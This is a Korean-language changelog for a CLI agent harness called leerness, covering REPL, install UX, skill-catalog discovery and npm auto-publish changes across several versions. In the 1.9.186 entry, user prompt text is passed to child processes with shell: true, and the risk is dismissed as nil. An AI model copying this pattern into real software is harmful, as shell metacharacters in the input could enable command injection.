-   cwd: process.cwd(),
-   env: _scrubEnv({}),
-   shell: false,
-   stdio: ['ignore', 'pipe', 'pipe']
- });
+ // 1.9.186 (사용자 명시 fix): Windows .cmd 호환을 위해 shell: true.
+ //   _cliChat (작동하는 함수) 이 runCommandSafe → spawnSync shell: true 패턴이라서 작동.
+ //   _cliChatStream 도 동일하게 shell: true 사용 (DEP0190 은 1.9.184/185 fix 로 억제됨).
+ child = cp.spawn(cmd, args, {
+   cwd: process.cwd(),
+   env: _scrubEnv({}),
+   shell: true,
+   stdio: ['ignore', 'pipe', 'pipe']
+ });
```

### Fix #2 — claude default = plain `--print` (stream-json opt-in)
```diff
- if (provider === 'claude')  { cmd = 'claude'; args = ['--print', '--output-format=stream-json', '--verbose', promptText]; }
+ // 1.9.186 (사용자 명시 fix): claude --output-format=stream-json 가 일부 버전에서 빈 응답.
+ //   default 를 plain --print 로 변경 → _cliChat 과 동일한 인자, 작동 검증된 패턴.
+ //   stream 형식 사용 opt-in: LEERNESS_REPL_STREAM_FORMAT=json
+ const useStreamJson = process.env.LEERNESS_REPL_STREAM_FORMAT === 'json';
+ if (provider === 'claude') {
+   cmd = 'claude';
+   args = useStreamJson
+     ? ['--print', '--output-format=stream-json', '--verbose', promptText]
+     : ['--print', promptText];
+ }
```

handleClaudeStream 조건부 호출 (useStreamJson 일 때만):
```diff
- if (provider === 'claude') {
+ if (provider === 'claude' && useStreamJson) {
    handleClaudeStream(chunk);
  } else {
    stopSpinner();
```

### 구조 최적화 체크 (사용자 명시 보강)

**보고서**: `_reports/structure-optimization-1.9.186.md`

**메트릭**:
- bin/harness.js: **~12000 lines** (1 monolithic)
- 의존성 **0** (Node built-in)
- npm tarball ~358 KB (gzipped)
- MCP 54 · CLI 100+ · 함수 250+

**최적화 강점** (유지):
- 의존성 0 정책 (cross-platform + supply chain risk 최소)
- 메모리 캐싱 (usage-stats / listAllSkills / lessons keyword index)
- Provider/MCP/Bridge 명확한 abstraction
- runCommandSafe sandbox (cwd jail + env scrub)
- 매 라운드 stress + e2e + main 자동 push

**최적화 약점** (1.9.187+ 후보):
- ⚠ Monolithic 12000 lines — 현 상태 유지 (npm pack 단순성 우선)
- ⚠ `_cliChat` ↔ `_cliChatStream` 코드 중복 — 1.9.186 fix가 이 갭에서 발생. 1.9.187 후보: `_buildCliArgs` 공통 헬퍼
- ⚠ skill catalog 캐시 stale 가능 — mtime 기반 invalidation 후보
- ⚠ MCP tools/list 매번 재생성 — 메모리 캐시 후보
- ⚠ 280 task 누적 — archive 자동화 (1.9.190+)

### 1.9.186 fix 정합성 (보고서 §4)
| 영향 | 평가 |
|---|---|
| 보안 (shell escape) | promptText 는 사용자 직접 입력, REPL 안에서만 사용 → 추가 위험 없음 |
| 성능 | shell:true 가 ~10ms 느림 (무시 가능) |
| 다른 provider (codex/gemini/copilot) | shell:true 동일 적용 — 더 안정적 (.cmd 호환) |
| 실시간 스트리밍 (1.9.170 사용자 명시) | LEERNESS_REPL_STREAM_FORMAT=json 으로 opt-in 가능 — 기능 유지 |
| 기존 작동 | `_cliChat` 변경 X — `agents multi --execute` 회귀 없음 |

### Verified
- stress-v131: **16/16 PASS** (사용자 명시 4 + live 3 + 누적 9)
- e2e 217/217 baseline 유지
- live 검증: `agents multi --execute --only claude` 실 호출 응답 "2" (4.5초)
- VERSION = 1.9.186 · autonomous-rounds = 116 · main 자동 push 47 라운드 연속

---

## 1.9.185 — 2026-05-21

**🔧 DEP0190 자식 process 전파 fix + REPL stream 친절 진단 + Hermes UX 분석 보고 (사용자 명시).**

자율 모드 115 라운드. 사용자 명시 3종:
1. *"REPL 에이전트 모드 구동 실패 + 추론내용/diff 미표시"* → 친절한 진단 메시지
2. *"agent[claude/actor/▶]> (node:54076) [DEP0190] ..."* → 자식 process 전파 fix
3. *"SSH duffy@192.168.68.89 의 hermes REPL UX 확인 → 유사 구현"* → 보고서 작성

### Fix #1 — DEP0190 자식 process 전파
1.9.184 의 `process.on('warning')` 핸들러는 부모만. claude/codex/gemini CLI 가 내부 Node child 를 spawn할 때 자식에 상속 X → 사용자 REPL 입력 후에도 DEP0190 출력.

```js
// 1.9.185 (사용자 명시): NODE_OPTIONS=--no-deprecation 자동 설정 → 모든 Node child 까지 전파.
if (!/--no-deprecation/.test(process.env.NODE_OPTIONS || '')) {
  process.env.NODE_OPTIONS = ((process.env.NODE_OPTIONS || '') + ' --no-deprecation').trim();
}
```

`process.env` 변경은 자식 spawn 시 상속. 부모는 1.9.184 의 `process.on('warning')` 으로 처리.

### Fix #2 — REPL stream 실패 친절 진단
**Before**:
```
agent[claude/actor/▶]> 웹개발을 진행해줘
  ── /stream (120053ms) ──
  ⚠ 실패: exit=null
     💡 전환 가능: :provider codex / :provider gemini / :provider copilot
```

**After**:
```
agent[claude/actor/▶]> 웹개발을 진행해줘
  ── /stream (120053ms) ──
  ⚠ claude CLI 응답 실패: exit=null
     ↳ 가능 원인: (1) claude CLI 응답 시간 초과 (모델 로딩/큰 응답 대기 중)
                  (2) network/auth 문제 (특히 codex/gemini 는 인터넷 + 토큰 필요)
     ↳ 직접 검증: claude --print "ping"
     💡 즉시 전환: :provider codex · :provider gemini · :provider copilot  또는 Tab 키
```

실패 케이스 분기:
- `exit=null` / `timeout` → 응답 시간 초과 + 직접 검증 명령
- `exit=1` / `unauth` / `login` → 인증 누락 + login 명령 (claude/codex/gemini login, copilot=gh auth login)

### #3 — Hermes UX 분석 (사용자 SSH 접속 요청)

**SSH 보안 정책**: 패스워드는 `LEERNESS_SSH_PASS` env 변수로만 전달. paramiko 임시 스크립트는 분석 완료 후 즉시 삭제. 코드/로그에 절대 저장 X.

**Hermes 사양 확인** (v0.14.0, Python 3.11, 89 commands · 29 tools · 85 skills):
- 위치: `~/.local/bin/hermes` (Ollama hermes-gemma:latest)
- 2-column Welcome 박스 (logo + toolsets/skills catalog)
- 실시간 상태바: `⚕ model │ ctx % │ [progress bar] │ elapsed │ ⏲ timer`
- minimal prompt: `❯ `
- slash commands: `/help`, `/compress`, `/quit`
- `-z/--oneshot` 스크립트 모드 (배너/스피너/세션ID 모두 제거)

**leerness 차용 후보** (1.9.186+):
1. 상태바 실시간 갱신 (`⚡ provider │ ctx N% │ [bar] │ elapsed │ ⏲ timer`)
2. `:compress` slash command — context 압축
3. 2-column Welcome 박스 재디자인
4. `--oneshot/-z` 명확화 (배너/스피너 제거)
5. Tip 라인 (`✦ Tip: ...`)

상세 보고서: `_reports/hermes-ux-analysis-1.9.185.md` (비공개)

### Verified
- stress-v130: **15/15 PASS** (사용자 명시 4 + live 3 + 누적 8)
- e2e 217/217 baseline 유지
- `agents list` 호출: DEP0190 출력 없음 ✓
- VERSION = 1.9.185 · autonomous-rounds = 115 · main 자동 push 46 라운드 연속

---

## 1.9.184 — 2026-05-21

**🎨 설치 UX 4종 — Ctrl+C 확인 prompt + 로딩바 + skillpack 제외 + DEP0190 억제 (사용자 명시).**

자율 모드 114 라운드. 사용자 명시 4종:
1. *"설치 가이드에서 Ctrl+C 입력 시 설치 종료 여부 확인 로직 추가"* → SIGINT handler (2단계 confirm)
2. *"leerness 파일 설치 시작 시 로딩바로 구현 + 생성 목록 나열 X"* → progress bar (TTY)
3. *"leerness-skillpack 미사용 예정 → 제외"* → 안내 메시지 제거
4. *"REPL agent 모드 진입 시 DEP0190 deprecation warning 제거"* → process warning handler

### Fix #1 — Ctrl+C 종료 확인 prompt
```js
// 1.9.184 (사용자 명시): 설치 도중 Ctrl+C 시 종료 확인 prompt.
//   첫 Ctrl+C → 안내 (2초 이내 한 번 더 → 종료, 그 외 → 계속).
let _sigintCount = 0; let _sigintTimer = null;
const _sigintHandler = () => {
  _sigintCount++;
  if (_sigintCount === 1) {
    process.stdout.write('\n\n  ⚠ 설치 중단하시겠습니까? Ctrl+C 를 2초 이내에 한 번 더 누르면 종료됩니다. (그 외 → 계속 진행)\n');
    _sigintTimer = setTimeout(() => { _sigintCount = 0; }, 2000);
    return;
  }
  process.exit(130);
};
```
install 시작에 등록, 종료/REPL 진입 시 cleanup.

### Fix #2 — 파일 설치 progress bar (생성 목록 미표시)
**Before** (line by line):
```
✓ create: AGENTS.md
✓ create: CLAUDE.md
✓ create: .harness/HARNESS_VERSION
✓ create: .harness/manifest.json
... (수십 줄)
```

**After** (single progress bar):
```
  ████████████████░░░░ 24/30 (80%) .harness/skills/office/SKILL.md
```
완료 시:
```
  ✓ leerness 파일 설치 완료 (30개)
```

### Fix #3 — leerness-skillpack 안내 제거
```diff
- if (SKILLPACK_SOURCE === 'builtin') log(`Skill catalog source: builtin (leerness-skillpack 미설치 — npm i leerness-skillpack 로 확장 가능)`);
- else log(`Skill catalog source: ${SKILLPACK_SOURCE} (leerness-skillpack${SKILLPACK_META ? ` v${SKILLPACK_META.version}` : ''})`);
+ // 1.9.184 (사용자 명시): leerness-skillpack 미사용 정책 — 안내 메시지 제거. builtin catalog 만 사용.
```

### Fix #4 — DEP0190 DeprecationWarning 억제
파일 최상단에서 process warning handler 등록:
```js
// 1.9.184: DEP0190 (child_process shell: true) deprecation warning 억제 (사용자 명시).
//   leerness 는 cross-platform PATH resolution 을 위해 shell: true 를 의도적으로 사용.
process.removeAllListeners('warning');
process.on('warning', (w) => {
  if (w && (w.code === 'DEP0190' || /DEP0190/.test(String(w.message || '')))) return;
  process.stderr.write(`(node:${process.pid}) ${w.name || 'Warning'}: ${w.message || w}\n`);
});
```

**Before** (REPL 진입 시):
```
agent[claude/actor/▶]> (node:54076) [DEP0190] DeprecationWarning: Passing args to a child process with shell option true...
```

**After** (REPL 진입 시):
```
agent[claude/actor/▶]> _
```
깔끔.

### Verified
- stress-v129: **14/14 PASS** (사용자 명시 4 + live install 3 + 누적 7)
- e2e 217/217 baseline 유지
- live install 검증:
  - DEP0190 출력 안 됨 ✓
  - "Skill catalog source: builtin" 안내 없음 ✓
  - 파일 생성 목록 0건 (non-TTY) ✓
- VERSION = 1.9.184 · autonomous-rounds = 114 · main 자동 push 45 라운드 연속

---

## 1.9.183 — 2026-05-21

**📦 npm i leerness + 구버전 자동 감지/경고/업데이트 명령어 안내 (사용자 명시 3종).**

자율 모드 113 라운드. 사용자 명시:
1. *"(vercel/anthropic) 표기는 제거"* → 일반화
2. *"vercel/anthropic 포함한 다른 공식 스킬도 자동 탐색하는 게 맞는지 확인"* → 검증 통과
3. *"npm i leerness 사용 가능하게 + 구버전 감지/경고/업데이트 명령어 안내"* → 모든 명령에 stale check 진입

### 1. 표기 일반화
```diff
- 🌐 공식 catalog 자동 탐색 (vercel/anthropic) · 자가 성장형
+ 🌐 공식 catalog 자동 탐색 · 자가 성장형 · 구버전 감지/안내
```

### 2. 다른 공식 catalog 자동 탐색 확인 (live)
```bash
$ leerness skill discover --all-presets
  fetching vercel-labs/agent-skills...
  ✓ vercel-labs/agent-skills: 8개 skill 발견
  fetching anthropics/skills...
  ✓ anthropics/skills: 17개 skill 발견
전체 25건
```
**vercel + anthropic 모두 정상 작동**. 다른 공식 organization은 `--github <owner/repo>` 옵션으로 즉시 추가 가능 (`vercel-labs/agent-skills`, `anthropics/skills` 외에 새 공식 등장 시 preset 등록).

조사 결과 — 1.9.183 시점 표준 SKILL.md 카탈로그를 갖춘 공식 organization:
- `vercel-labs/agent-skills` (8개) ← preset `vercel`
- `anthropics/skills` (17개) ← preset `anthropic`
- `modelcontextprotocol/servers` — SKILL.md 형식 아님 (MCP server 구현 — leerness skill 호환성 X)
- 기타 — 미발견. 새 공식 등장 시 즉시 preset 등록 가능.

### 3. 구버전 자동 감지 강화 (모든 명령)
**Before**: init/migrate 시점만 stale check (다른 명령은 skip)
**After**: 거의 모든 명령 시점에 stale check (init/migrate/mcp/release/version/help 제외 — 출력 민감 명령은 skip)

```js
// 1.9.183 (사용자 명시): 모든 명령 시점에서 구버전 감지 + 경고 + 업데이트 명령어 안내
const _staleSkip = new Set(['init', 'migrate', 'usage', 'mcp', 'release', 'session-close', '--version', '--help', 'help', 'update', 'whats-new']);
if (!_staleSkip.has(cmd) && process.env.LEERNESS_NO_STALE_CHECK !== '1' && !has('--no-stale-check')) {
  const cached = readUpdateCache(root);
  if (cacheFresh(cached, 24) && cached.nextLeerness && compareVer(cached.nextLeerness, VERSION) > 0) {
    process.stderr.write(`  ⚠ leerness v${VERSION} → v${cached.nextLeerness} 사용 가능 · npm i leerness@latest 권장 ...`);
  }
}
```

**실 동작 검증** (캐시 시뮬레이션):
```
$ leerness audit .
  ⚠ leerness v1.9.183 → v1.9.999 사용 가능 · npm i leerness@latest 권장 (LEERNESS_NO_STALE_CHECK=1 로 끄기)
✓ no duplicate design guide candidates
[...]
```

### 4. `npm i leerness` 첫 권장 (글로벌 → 로컬 우선)
init 시점 stale 메시지도 갱신:
```
해결 — 셋 중 하나 실행 후 다시 시도:
  npm i leerness@latest                  # 프로젝트 로컬 설치 (1.9.183 권장)
  npm i -g leerness@latest               # 글로벌 설치
  npx --yes clear-npx-cache && npx leerness@latest init .
```

### npm registry 상태
```bash
$ npm view leerness version
1.9.182  ← 직전 publish
$ npm view leerness dist-tags
{ latest: '1.9.182' }
```
이번 라운드 release sync-main 후 `latest: '1.9.183'` 으로 자동 갱신.

### Verified
- stress-v128: **16/16** (사용자 명시 3 + 구버전 감지 4 + npm 배포 2 + VERSION+누적 7)
- e2e 217/217 baseline 유지
- VERSION = 1.9.183 · autonomous-rounds = 113 · main 자동 push 44 라운드 연속

---

## 1.9.182 — 2026-05-21

**🌐 공식 조직 스킬 catalog 자동 탐색 — vercel-labs/agent-skills + anthropics/skills 직접 통합 (사용자 명시).**

자율 모드 112 라운드. 사용자 명시: *"공식 조직의 스킬 모음을 탐색해서 다운로드 받아서 스킬을 사용하는지 확인 (vercel-labs/agent-skills, anthropics/skills) + 지금 설계하는 방향이 올바른지 판단도 너가 해줘"*.

### 핵심 추가

#### 1. `SKILL_CATALOG_PRESETS` — 내장 공식 catalog
```js
const SKILL_CATALOG_PRESETS = {
  'vercel':    { owner: 'vercel-labs', repo: 'agent-skills', branch: 'main', path: 'skills' },
  'anthropic': { owner: 'anthropics',  repo: 'skills',       branch: 'main', path: 'skills' }
};
```

#### 2. `_fetchGitHubSkills(owner, repo, branch, dirPath)` — GitHub Contents API 직접 호출
- rate limit: 60 req/hr (LEERNESS_GITHUB_TOKEN 시 5000 req/hr)
- 응답을 표준 entry 형식으로 변환 (name, url, description, source, homepage)
- raw.githubusercontent.com URL 자동 구성

#### 3. `leerness skill discover` 확장
```bash
$ leerness skill discover --preset anthropic
# leerness skill discover (1.9.182 — GitHub presets)
targets: anthropics/skills#main:skills
  fetching anthropics/skills...
  ✓ anthropics/skills: 17개 skill 발견
전체 17건 (전체 표시 — 매칭 없음)

| name | source | url |
|---|---|---|
| algorithmic-art | github:anthropics/skills | https://raw.githubusercontent.com/anthropics/skills/main/skills/algorithmic-art/SKILL.md |
| mcp-builder | github:anthropics/skills | https://raw.githubusercontent.com/anthropics/skills/main/skills/mcp-builder/SKILL.md |
| ...
```

신규 옵션:
- `--preset <name>` — 내장 catalog (vercel, anthropic)
- `--all-presets` — 모든 preset 동시 탐색
- `--github owner/repo[#branch][:path]` — 직접 GitHub repo 지정

#### 4. `leerness skill auto-install` — 신규 명령 (사용자 명시 핵심)
```bash
$ leerness skill auto-install --query "mcp"
# leerness skill auto-install (1.9.182)
presets: vercel, anthropic
query: mcp
mode: 🟡 dry-run (LEERNESS_SKILL_AUTO_INSTALL=1 또는 --yes 필요)
  fetching anthropics/skills...
  ✓ anthropics/skills: 17개 skill
매칭 1/17건 (query: mcp)
| mcp-builder | github:anthropics/skills | https://raw.githubusercontent.com/anthropics/skills/main/skills/mcp-builder/SKILL.md |

💡 자동 install 활성화: .env 에 LEERNESS_SKILL_AUTO_INSTALL=1 또는 leerness skill auto-install --yes
```

- handoff 컨텍스트에서 자동 query 추출 (진행 task 키워드)
- LEERNESS_SKILL_AUTO_INSTALL=1 시 실제 다운로드 (보안 opt-in)
- 미설정 시 dry-run (추천만)

#### 5. .env.example 보강
```
LEERNESS_SKILL_AUTO_INSTALL=0
LEERNESS_SKILL_AUTO_PRESETS=vercel,anthropic
```

### 실 검증 (live GitHub API)
- **anthropics/skills 17개 skill 자동 발견**:
  algorithmic-art, brand-guidelines, canvas-design, claude-api, doc-coauthoring, **docx**, frontend-design, internal-comms, **mcp-builder**, **pdf**, **pptx**, skill-creator, slack-gif-creator, theme-factory, web-artifacts-builder, **webapp-testing**, **xlsx**
- **mcp-builder 실 다운로드 + 설치 성공**:
  `leerness-stress/.harness/skills/mcp-builder/SKILL.md` 다운로드 검증
  description: "Guide for creating high-quality MCP (Model Context Protocol) servers..."

### 방향성 평가 보고서 (사용자 명시)
사용자 요청: *"지금 설계하는 방향이 올바른 방향인지 판단도 너가 해줘"*. 보고서: `_reports/direction-1.9.182.md` (비공개).

**결론**:
| 평가 항목 | 점수 |
|---|---|
| 자율성 (auto loop · review · install) | 8.5/10 |
| 성장성 (learn · suggest · skill catalog) | 8/10 |
| 안전성 (sandbox · permissions · env opt-in) | 9/10 |
| 범용성 (multi-provider · MCP · bridges) | 8/10 |
| 검증 가능성 (verify-claim · stress · e2e) | 9.5/10 |

**종합**: 86/100. **올바른 방향**. 약점은 *스킬 적용 후 회고 부재 + 외부 스킬 신뢰성 검증* — 1.9.183~190 마일스톤.

### Verified
- stress-v127: **16/16** (preset 4 + .env 라우팅 2 + 실 GitHub fetch 3 + VERSION+누적 회귀 7)
- e2e 217/217 baseline 유지
- VERSION = 1.9.182 · autonomous-rounds = 112 · main 자동 push 43 라운드 연속

---

## 1.9.181 — 2026-05-21

**🚪 REPL 진입 흐름 정리 — 사용자 명시 4종 + 직접 구동 실 호출 검증.**

자율 모드 111 라운드. 사용자 직접 구동 테스트 결과 보고 (스크린샷 첨부):
1. *"1.9.149 Hermes/OpenClaw 스타일 등의 문구는 제거"* → 설치 완료 메시지 단순화
2. *"이 단계에서 Ollama 제외한 모델을 선택했는데 REPL 진입 시 Ollama 우선 호출"* → install→REPL provider 자동 선택
3. *"프로바이더 전환 선택 단계 없이 바로 채팅 모드로 진입"* → 진입 prompt 제거
4. *"REPL을 직접 구동해서 명령 입력해보고 개발/웹/PC/추론/질문-답변 동작 테스트"* → agents multi --execute 실 호출 검증

### Fix #1 — 문구 단순화
```diff
- log('🚀 설치 완료 — REPL agent 모드를 시작합니다 (1.9.149 Hermes/OpenClaw 스타일)...');
+ log('🚀 설치 완료 — REPL agent 모드를 시작합니다...');
```

### Fix #2 — install→REPL provider 하드코딩 제거
```diff
- await _agentRepl(root, { provider: 'ollama', role: 'actor' });  // 1.9.151 — 무조건 ollama
+ await _agentRepl(root, { role: 'actor' });  // provider 미지정 → auto-select 동작 (1.9.181 fix)
```

### Fix #3 — 비-Ollama 우선 자동 선택 (Ollama 우선 호출 X)
```js
const ready = EXTERNAL_AGENTS.map(a => ({ def: a, status: _checkAgent(a) }))
                              .filter(x => x.status.status === 'ready');
const nonOllama = ready.filter(x => x.def.id !== 'ollama');
if (nonOllama.length >= 1) {
  // 비-Ollama 활성 → 첫 번째 자동 (사용자 명시: Ollama 우선 호출 X)
  initialProvider = nonOllama[0].def.id;
  _autoPickNote = nonOllama.length === 1
    ? `${initialProvider} 자동 선택 (활성 CLI 1개)`
    : `${initialProvider} 자동 선택 (활성 CLI ${nonOllama.length}개 · Tab으로 전환)`;
}
```

### Fix #4 — provider 전환 prompt 단계 제거 (자동 전환)
이전:
```
⚠ Ollama 미가동 또는 모델 없음
💡 활성 외부 CLI 4개 발견 — provider 전환 가능:
  1) claude  (v2.1.145)
  2) codex  (vcodex-cli 0.132.0)
  ...
provider 전환 (번호 / Enter=ollama 계속): _
```
지금:
```
▸ Provider: claude 자동 선택 (활성 CLI 4개 · Tab으로 전환)
[채팅 모드 즉시 진입]
```

### 직접 구동 실 호출 검증 (사용자 명시 4번째 요청)
```bash
$ leerness agents multi "1+1=? 숫자만 답해주세요." --only claude,gemini --execute --timeout 30
✓ claude   · 4810ms · 1 토큰
✗ gemini   · 1266ms · exit=null
best: claude · score=0.600
--- 처음 600자 ---
2
```
**claude 추론 응답 정상**. gemini는 별도 환경 이슈 (--yolo 권한 또는 quota — 1.9.182에서 추가 디버그 후보).

### Verified
- stress-v126: **18/18** (사용자 명시 4 + 자동 선택 동작 4 + 직접 구동 2 + VERSION+누적 회귀 8)
- e2e 217/217 baseline 유지
- claude 실 호출 4810ms · 응답 "2" — REPL agent의 핵심 능력 (실 모델 호출 + 추론 + 응답 수신) 동작 확인
- VERSION = 1.9.181 · autonomous-rounds = 111 · main 자동 push 42 라운드 연속

---

## 1.9.180 — 2026-05-21

**🔧 REPL Tab cycle 핵심 fix + 채팅 영역 separator — 사용자 명시 (직접 구동 테스트 결과).**

자율 모드 110 라운드. 사용자 명시: *"REPL agent 모드를 네가 직접 구동해서 테스트해줘 / REPL agent 모드는 고정된 헤더와 채팅형식이어야해 / 그리고 모델이나 프로바이더 전환이 원활하지않은거같아"*.

### 핵심 fix — Tab cycle 실 동작 보장

#### 1. readline `completer` no-op
```js
// 1.9.180: completer no-op — readline의 자체 Tab completion이 keypress 리스너를 가로채는 문제 차단
const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout,
  completer: (line) => [[], line]
});
```
이전: 사용자가 Tab을 누르면 readline 기본 completer가 빈 결과를 표시하며 prompt를 재출력해 keypress 리스너가 동작하지 않을 때가 있었음.
지금: `completer: () => [[], line]` 명시로 readline의 Tab 가로채기 차단 → keypress 리스너가 항상 발동.

#### 2. Shift+Tab → `cycleModel(false)` 매핑 수정 (CRITICAL)
```js
process.stdin.on('keypress', (str, key) => {
  if (!key) return;
  if (key.name === 'tab') {
    // 1.9.180 fix: Shift+Tab → cycleModel (이전 cycleProvider 잘못)
    if (key.shift === true) {
      cycleModel(false);  // Shift+Tab → 현재 provider의 모델 cycle
    } else {
      cycleProvider(false);  // Tab → 다음 provider
    }
  }
});
```
이전 (1.9.170): `cycleProvider(key.shift)` — Shift+Tab은 provider reverse 였고 model cycle 키가 없었음.
지금: 사용자 의도대로 `Tab=provider`, `Shift+Tab=model`.

### 시각 피드백 강화 (사용자 명시: "원활하지 않음")
```
⇄ provider [3/5]: claude ✓ ready
└ 7개 모델 catalog · Shift+Tab으로 model cycle

⇄ model [2/7]: claude-opus-4
└ 최신 thinking 모델
```
- bold green provider · bold magenta model
- `[idx/total]` 위치/총수 표시
- ready/⚠ status 활성 여부 표시
- catalog 모델 수 노출

### 채팅 영역 separator (사용자 명시: "고정된 헤더와 채팅형식")
```
[... 환영 화면 (헤더 + Tips + What's new + Slash + 키보드 + 상태바) ...]

  ─────────────────────────────  채팅 시작  ─────────────────────────────
  메시지 입력 후 Enter · :help 으로 명령 목록 · Ctrl+C 로 종료

agent[ollama/actor/▶]> _
```
환영 화면 (고정 헤더) 과 입력 영역 (채팅) 의 시각적 구분을 명확하게.

### Verified
- e2e 217/217 baseline 유지
- stress-v125: **17/17** (Tab cycle fix 3 + 시각 피드백 4 + 채팅 영역 3 + 누적 회귀 7)
- VERSION = 1.9.180 · autonomous-rounds = 110 · main 자동 push 41 라운드 연속

---

## 1.9.179 — 2026-05-21

**🎨 REPL 환영 화면 재디자인 — Hermes/Claude/Codex/Gemini CLI 스타일 (사용자 명시).**

자율 모드 109 라운드. 사용자 명시: 첨부 이미지 (Hermes Agent v0.7.0 / Claude Code v2.1.126 / OpenAI Codex v0.132.0 / Gemini CLI v0.42.0) 처럼 구조화된 환영 화면.

### 디자인 구성 — 5 섹션
```
╭────────────────────────────────────────────────────────────────────────╮
│  Leerness Agent  v1.9.179  (2026-05-21)  ·  검수·기억·샌드박스 통합 AI │
╰────────────────────────────────────────────────────────────────────────╯

  ▸ Welcome back  ·  leerness (.)
  ▸ Session: sess-2026-05-21T13-41-23

  ┌─ Tips for getting started ──────────────────────────────────────────┐
  │  Tab / Shift+Tab    — provider / model 전환 (1.9.170)                │
  │  :review "<req>"    — 무조건 구현 전 사전 검토 (1.9.176)             │
  │  :permissions <m>   — 즉시 권한 변경 basic|extended|full (1.9.174)   │
  │  :stream on|off     — 실시간 스트리밍 토글 (default ON, 1.9.170/172) │
  └─────────────────────────────────────────────────────────────────────┘

  ┌─ What's new (1.9.170~178) ─────────────────────────────────────────┐
  │  • REPL Tab cycle + 실시간 스트리밍 (spinner / tool_use / diff 색깔) │
  │  • Bridge slash :web/:pc/:lsp REPL 즉시 호출 + LSP 다국어 5종        │
  │  • review-request 사전 검토 + task add 자동 trigger                  │
  │  • release sync-main 자동 npm publish (.env NPM_TOKEN)               │
  │  • 6 능력 매트릭스 72% production-ready · MCP 54 도구                │
  └────────────────────────────────────────────────────────────────────┘

  Available Slash (5 그룹)
    • meta:        :help :model :role :provider :status :stream :clear :quit
    • internal:    :verify :audit :handoff :health
    • memory:      :lessons :brainstorm :tasks :plan
    • bridge:      :web :pc :lsp (각 sub: check/symbols/click/screenshot/...)
    • review:      :review "<request>"  ·  :permissions [basic|extended|full]

  ⌨  Tab=provider cycle  ·  Shift+Tab=model  ·  Ctrl+C=quit

  ⚡ provider=ollama  ·  model=llama3  ·  role=actor  ·  perms=basic  ·  ▶ stream=on

agent[ollama/actor/▶]> _
```

### 디자인 결정
- **둥근 모서리** (`╭ ╰`) 헤더 박스 → 친근한 인상
- **사각 모서리** (`┌ └`) Tips/What's new 박스 → 정보 박스 구분
- **색깔 토큰**: cy(헤더), yel(Tips), green(What's new), mag(model), bold(중요 라벨)
- **5 그룹 Slash 카탈로그**: Hermes-style "Available Tools / Skills" 영감
- **상태바 ⚡**: provider/model/role/perms/stream 5요소 + 색깔 구분
- **키보드 단축키 ⌨**: Tab/Shift+Tab/Ctrl+C 명시

### 첨부 이미지 참고 spirit (정확히 복제 X)
| 이미지 | 적용된 요소 |
|---|---|
| Hermes Agent v0.7.0 | "Available ..." 카탈로그 5 그룹 |
| Claude Code v2.1.126 | "Welcome back" + "Tips/What's new" 박스 |
| OpenAI Codex v0.132.0 | 모델/디렉토리 박스 + Tips |
| Gemini CLI v0.42.0 | 상태바 (sandbox/model/quota → provider/model/perms/stream) |

### Verified
- e2e 217/217 baseline 유지
- stress-v124: **19/19** (헤더 박스 4 + Slash 5그룹 3 + 상태바 3 + 1.9.179 주석 2 + 누적 회귀 7)
- VERSION = 1.9.179 · autonomous-rounds = 109 · main 자동 push 40 라운드 연속

---

## 1.9.178 — 2026-05-21

**📦 사용자 명시: `release sync-main` 자동 npm publish — .env NPM_TOKEN 사용.**

자율 모드 108 라운드. 사용자 명시: *"NPM 액세스 토큰 .env에 입력해뒀음. 업데이트될 때마다 깃허브처럼 NPM에도 자동 배포"*.

### 통합 흐름
```bash
$ leerness release sync-main .
# leerness release sync-main (1.9.140)
from: release/1.9.178 → main
✓ main merged: release/1.9.178
✓ main pushed → origin/main

📦 npm publish 자동 trigger (1.9.178)
   leerness@1.9.178
   npm publish 시도 중...
✓ npm publish 완료: leerness@1.9.178
```

→ git push 후 NPM 자동 publish — git 워크플로와 NPM 워크플로 완전 통합.

### 보안 설계 (3중 안전망)
1. **토큰 환경변수만 사용**: `process.env.LEERNESS_NPM_TOKEN || process.env.NPM_TOKEN` (값 절대 로그 X)
2. **임시 `.npmrc` 격리**: `mkdtempSync` → `.npmrc` (mode 0o600 소유자만 읽기) → publish → **finally 즉시 삭제**
3. **`.env` 자동 보호**: 1.9.75+ audit이 `.gitignore`에 `.env` 등록 강제 (시크릿 누락 감지)

### 중복 publish 차단
- `npm view <pkg>@<version> version` 사전 호출
- 이미 publish된 버전이면 skip + 알림 (race condition도 후속 처리)

### 친절한 에러 안내
- `EPUBLISHCONFLICT` → "이미 publish됨 — skip"
- `EAUTH / 401 / 403` → "토큰 권한 부족 또는 만료 — .env NPM_TOKEN 재발급 필요"
- `ENEEDAUTH` → "인증 미작동 — 토큰 형식 확인 (npm_xxxxx)"
- 기타 → 마지막 3줄 stderr 노출

### Opt-out (3가지)
1. `--no-npm` 플래그
2. `LEERNESS_NO_NPM_PUBLISH=1` 환경변수
3. `--dry-run-npm` 플래그 (dry-run mode)

### Observability
`_recordRun(kind: 'npm_publish')` — 모든 publish 시도 (성공/실패) 자동 기록.

### Verified
- e2e 217/217 baseline 유지 (LEERNESS_NO_NPM_PUBLISH=1 환경)
- stress-v123: **22/22** (함수 정의 6 + 중복 차단 4 + release 통합 3 + 친절한 안내 3 + 누적 회귀 6)
- VERSION = 1.9.178 / autonomous-rounds = 108 / main 자동 push 39 라운드 연속 + **NPM 자동 publish 1 라운드 시작**

---

## 1.9.177 — 2026-05-21

**🔁 `task add` 자동 review-request trigger — 사용자 명시 1.9.176 자동화.**

자율 모드 107 라운드. 1.9.176 (사용자 명시: 무조건 구현 전 사전 검토) 의 자동화 — 사용자/AI가 `task add` 호출 시 review를 직접 실행하지 않아도 자동 trigger.

### 통합 흐름
```bash
$ leerness task add "OAuth 로그인 구현해줘"
✓ task added: T-0001

🔍 review-request (1.9.177 자동): type=feature · ✓ 진행 안전 (705ms)
   권장 단계:
     1) leerness reuse find "<핵심 capability>" — 중복 구현 사전 차단
     2) leerness plan add "<milestone>" — 진행 추적
     ... +2건 (leerness review-request "OAuth 로그인 구현해줘" 으로 전체 보기)
   💡 👥 leerness agents recommend feature — 작업 유형별 sub-agent 매핑 활용 가능
```

→ 사용자/AI가 명시적으로 `:review` 호출 안 해도, `task add` 만으로 자동 사전 검토 완료. **1.9.176 사용자 명시 의도가 default 동작에 통합**.

### Opt-out (3 가지)
1. CLI 플래그: `leerness task add "..." --no-review`
2. 환경변수: `LEERNESS_NO_AUTO_REVIEW=1`
3. 운영 메타: `--status done|dropped|blocked` (이미 종료된 작업은 review 불필요)

### 표시 정책 (간결)
